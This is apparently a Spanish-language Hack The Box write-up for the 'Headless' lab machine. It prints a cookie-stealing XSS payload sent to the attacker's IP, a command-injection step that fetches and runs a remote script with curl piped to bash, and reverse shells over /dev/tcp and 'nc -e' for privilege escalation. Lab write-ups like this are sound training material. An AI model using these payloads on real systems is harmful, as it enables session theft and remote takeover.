---
title: Headless
description: Headless es una máquina Linux de dificultad fácil que cuenta con un servidor Python Werkzeug que aloja un sitio web. El sitio web tiene un formulario de soporte al cliente, el cual resulta ser vulnerable a blind Cross-Site Scripting (XSS) a través del encabezado User-Agent. Esta vulnerabilidad se utiliza para robar una cookie de administrador, que luego se usa para acceder al panel de administración. La página es vulnerable a inyecciones de comandos, lo que permite obtener un shell inverso en la máquina. Al enumerar el correo del usuario, se descubre un script que no utiliza rutas absolutas, lo cual se aprovecha para obtener un shell con privilegios de root.
date: 2024-05-23
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-headless/headless_logo.png
categories:
  - Hack The Box
  - Machines
tags:
  - linux
  - hack the box
  - xss
  - os command injection
  - sudo abuse
  - ssh
  - upnp
  - tcp
  - information gathering
  - web analysis
  - vulnerability exploitation
  - privilege escalation

---
## Information Gathering

```terminal
/home/kali/Documents/htb/machines/headless:-$ sudo nmap -sC -sV -p- 10.10.11.8
```

![](/assets/img/htb-writeup-headless/headless1.png)

```terminal
/home/kali/Documents/htb/machines/headless:-$ echo '10.10.11.8\theadless.htb' | sudo tee -a /etc/hosts
```
```terminal
/home/kali/Documents/htb/machines/headless:-$ gobuster dir -u http://10.10.11.8:5000 -w /usr/share/wordlists/dirb/big.txt
/dashboard (Status: 500) [Size:  265]
/support   (Status: 200) [Size: 2363]
```
---
## Web Analysis & Vulnerability Exploitation

![](/assets/img/htb-writeup-headless/headless1_1.png)
![](/assets/img/htb-writeup-headless/headless2.png)
![](/assets/img/htb-writeup-headless/headless3.png)
![](/assets/img/htb-writeup-headless/headless4.png)

La web presenta una vulnerabilidad de Cross-Site Scripting (XSS). Aprovechando esta vulnerabilidad, puedo robar una cookie que me permitiría autenticarme como un usuario autorizado.

Para explotar esta vulnerabilidad, intercepto una petición 'POST' del formulario ubicado en la dirección '/support'. Luego, configuro un servidor para recibir la cookie robada.
```terminal
/home/kali/Documents/htb/machines/headless:-$ python3 -m http.server 8003 
	Serving HTTP on 0.0.0.0 port 8003 http://0.0.0.0:8003/ ...
```
El ataque XSS tiene dos partes principales.

* Inyección de un script en el encabezado 'User-Agent' para robar cookies.

```
User-Agent: <script>var i=new Image(); i.src="http://10.10.16.59:8003/?cookie="+btoa(document.cookie);</script>
```

* Inyección del mismo script en un campo de formulario 'Contact Support' para robar cookies cuando se visualiza el contenido del mensaje.

```
fname=ad&lname=min&email=ad%http://40min.com/&phone=%2B55-555+5555&message=<script>var i=new Image(); i.src="http://10.10.16.59:8003/?cookie="+btoa(document.cookie);</script>
```

![](/assets/img/htb-writeup-headless/headless5.png)

```terminal
	... 10.10.11.8 - - [22/May/2024 19:36:24]
"GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -
```
Recibo la cookie en base64 y la descodifico.
```terminal
/home/kali/Documents/htb/machines/headless:-$ echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64 -d 
is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```
Intercepto una peticion 'GET' de la direccion '/dashboard', agrrego la nueva cookie y devuelvo la peticcion.

![](/assets/img/htb-writeup-headless/headless6.png)

Consigo autentificarme exitosamente.

![](/assets/img/htb-writeup-headless/headless7.png)

Analizando la peticion 'POST', encuentro que es vulnerable a OS Command Injection.

Creo una reverse shell y monto un servidor para que la maquina victima descarge el payload.
```terminal
/home/kali/Documents/htb/machines/headless:-$ echo "/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.16.59/4444 0>&1'" > payload.sh

/home/kali/Documents/htb/machines/headless:-$ python3 -m http.server 8001
	Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
```
Me pongo en escucha con Netcat e injecto el comando malisioso por Burpsuite.
```terminal
/home/kali/Documents/htb/machines/headless:-$ nc -nvlp 4444 
	listening on [any] 4444 ...
```

![](/assets/img/htb-writeup-headless/headless8.png)

```terminal
date=2023-09-15;curl http://10.10.16.59:8001/payload.sh%7Cbash > Send

 	...connect to [10.10.16.59] from (UNKNOWN) [10.10.11.8] 39442 

dvir@headless:~$ cat user.txt 
```

---
## Privilege Escalation

El usuiario 'dvir' puede ejecutar el comnado '/usr/bin/syscheck' como 'sudo'.

```terminal
dvir@headless:~$ sudo -l
```

![](/assets/img/htb-writeup-headless/headless9.png)

El comando '/usr/bin/syscheck' ejecuta el archivo 'initdb.sh'. Por tanto, puedo agregar un payload dentro del archivo 'initdb.sh'.

```terminal
dvir@headless:~$ cat /usr/bin/syscheck
```

![](/assets/img/htb-writeup-headless/headless10.png)

```terminal
dvir@headless:~$ echo "nc -e /bin/sh 10.10.16.59 1212" > initdb.sh
dvir@headless:~$ chmod +x initdb.sh
```
Agrego permisos de ejecucion, me pongo en escucha con Netcat y ejecuto el comando.
```terminal
/home/kali/Documents/htb/machines/headless:-$ nc -nvlp 1212
dvir@headless:~$ sudo /usr/bin/syscheck
```

![](/assets/img/htb-writeup-headless/headless11.png)

> <a href="https://www.hackthebox.com/achievement/machine/1521382/594" target="_blank">Headless Machine from Hack The Box has been Pwned</a>
{: .prompt-tip }